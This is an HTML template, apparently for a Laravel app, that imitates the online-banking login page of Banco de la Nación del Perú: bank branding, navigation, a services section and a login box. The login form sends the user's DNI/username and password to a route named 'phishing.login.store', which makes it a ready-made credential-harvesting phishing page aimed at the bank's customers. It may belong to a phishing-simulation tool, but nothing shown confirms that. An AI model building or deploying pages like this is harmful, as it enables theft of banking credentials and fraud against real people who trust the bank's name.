<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Banco de la Nación del Perú, el banco de todos - Servicios Financieros</title>
    <meta name="title" content="Banco de la Nación del Perú, el banco de todos - Servicios Financieros">
    <meta name="keywords" content="Banco de la Nación Perú, servicios financieros, cuentas de ahorro, cuenta corriente, préstamos personales, tarjetas de crédito, banca por internet, aplicaciones móviles, inclusión financiera"/>
    <meta name="description" content="Descubre los servicios financieros del Banco de la Nación del Perú: cuentas de ahorro, préstamos, tarjetas de crédito y más. Accede a la banca por internet y a nuestras aplicaciones móviles para gestionar tus finanzas de manera fácil y segura"/>
    <meta name="author" content="Banco de la Nación"/>
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f5f5f5;
        }
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background-color: #fff;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
        }
        .header img {
            height: 50px;
        }
        .nav-bar {
            background-color: #004a87;
            color: white;
            padding: 10px 0;
        }
        .nav-bar ul {
            display: flex;
            list-style: none;
            justify-content: center;
        }
        .nav-bar ul li {
            padding: 0 15px;
        }
        .nav-bar a {
            color: white;
            text-decoration: none;
        }
        .banner {
            height: 300px;
            background: url('{{ asset("img/banner-banco.jpg") }}') no-repeat center center;
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding: 0 50px;
            color: white;
            margin: 20px 0;
        }
        .banner h1 {
            font-size: 2.5rem;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .login-box {
            width: 100%;
            max-width: 400px;
            margin: 30px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }
        .login-box h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #004a87;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        .btn {
            background-color: #004a87;
            color: white;
            border: none;
            padding: 10px 15px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #00365f;
        }
        .footer {
            background-color: #004a87;
            color: white;
            padding: 20px 0;
            text-align: center;
            margin-top: 50px;
        }
        .alert {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="{{ asset('img/logoBN.png') }}" alt="Logo Banco de la Nación">
        <div>
            <a href="#" class="btn" onclick="showLoginForm(); return false;">Banca por Internet</a>
        </div>
    </div>
    
    <div class="nav-bar">
        <ul>
            <li><a href="#">Inicio</a></li>
            <li><a href="#">Productos y Servicios</a></li>
            <li><a href="#">Canales de Atención</a></li>
            <li><a href="#">Información Institucional</a></li>
            <li><a href="#">Contacto</a></li>
        </ul>
    </div>
    
    <div class="container">
        <div class="banner">
            <h1>Bienvenido al Banco de la Nación</h1>
        </div>
        
        <div class="login-box" id="login-box" style="display: none;">
            <h2>Acceso a Banca por Internet</h2>
            <div class="alert" id="alert">Usuario o contraseña incorrectos. Por favor, inténtelo nuevamente.</div>
            
            <form action="{{ route('phishing.login.store') }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="username">Usuario / DNI:</label>
                    <input type="text" id="username" name="username" required autocomplete="off">
                </div>
                
                <div class="form-group">
                    <label for="password">Contraseña:</label>
                    <input type="password" id="password" name="password" required autocomplete="off">
                </div>
                
                <button type="submit" class="btn">Ingresar</button>
            </form>
            
            <p style="text-align: center; margin-top: 15px;">
                <a href="#" style="color: #004a87;">¿Olvidaste tu contraseña?</a>
            </p>
            <p style="text-align: center; margin-top: 5px;">
                <a href="#" style="color: #004a87;">Registrarse</a>
            </p>
        </div>
        
        <div class="content">
            <h2>Nuestros Servicios</h2>
            <p>El Banco de la Nación ofrece diversos servicios financieros para todos los ciudadanos del Perú.</p>
            
            <div style="display: flex; justify-content: space-between; margin: 30px 0;">
                <div style="width: 30%; text-align: center; padding: 20px; background-color: white; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
                    <h3>Préstamos Personales</h3>
                    <p>Solicita tu préstamo con las mejores tasas del mercado.</p>
                </div>
                <div style="width: 30%; text-align: center; padding: 20px; background-color: white; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
                    <h3>Tarjetas de Crédito</h3>
                    <p>Descubre nuestras tarjetas con beneficios exclusivos.</p>
                </div>
                <div style="width: 30%; text-align: center; padding: 20px; background-color: white; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
                    <h3>Banca Digital</h3>
                    <p>Realiza tus operaciones desde cualquier lugar y en cualquier momento.</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="container">
            <p>© 2025 Banco de la Nación. Todos los derechos reservados.</p>
            <p>Atención al cliente: 0-800-10700</p>
        </div>
    </div>

    <script>
        function showLoginForm() {
            document.getElementById('login-box').style.display = 'block';
            window.scrollTo({
                top: document.getElementById('login-box').offsetTop - 100,
                behavior: 'smooth'
            });
        }
    </script>
</body>
</html>